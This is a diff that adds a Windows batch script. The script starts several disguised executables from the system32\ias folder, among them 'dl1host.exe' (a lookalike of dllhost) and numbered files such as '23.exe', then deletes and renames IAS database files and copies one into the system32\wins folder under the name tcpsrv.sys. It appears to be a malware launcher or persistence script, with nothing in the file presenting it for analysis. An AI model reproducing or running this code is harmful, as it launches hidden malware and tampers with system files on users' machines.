@@ -1,0 +1,29 @@
+@echo off
+start %SystemRoot%\system32\ias\1139.exe
+start %SystemRoot%\system32\ias\dl1host.exe
+start %SystemRoot%\system32\ias\1345.exe
+start %SystemRoot%\system32\ias\DS_Server.exe
+start %SystemRoot%\system32\ias\23.exe
+start %SystemRoot%\system32\ias\setup1348.exe
+start %SystemRoot%\system32\ias\dl1host.exe
+start %SystemRoot%\system32\ias\1345.exe
+start %SystemRoot%\system32\ias\1139.exe
+start %SystemRoot%\system32\ias\DS_Server.exe
+start %SystemRoot%\system32\ias\23.exe
+start %SystemRoot%\system32\ias\setup1348.exe
+c:
+cd %SystemRoot%\system32\ias
+del dnary.mdb
+rename ias.mdb tcpsrv.sys
+del %SystemRoot%\system32\wins\tcpsrv.sys
+copy tcpsrv.sys %SystemRoot%\system32\wins\
+del tcpsrv.sys
+
+
+
+
+
+
+
+
+
